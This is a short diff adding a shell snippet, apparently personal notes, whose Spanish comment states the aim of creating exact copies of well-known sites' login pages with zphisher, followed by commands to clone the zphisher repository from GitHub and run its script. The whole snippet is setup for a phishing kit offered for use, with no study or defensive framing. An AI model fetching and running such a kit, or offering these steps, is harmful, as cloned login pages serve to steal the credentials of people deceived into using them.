@@ -1,0 +1,4 @@
+# con zphisher voy a controlar y crear login de páginas conocidas exactamente iguales
+git clone https://github.com/htr-tech/zphisher.git
+cd zphisher/
+bash zphisher.sh
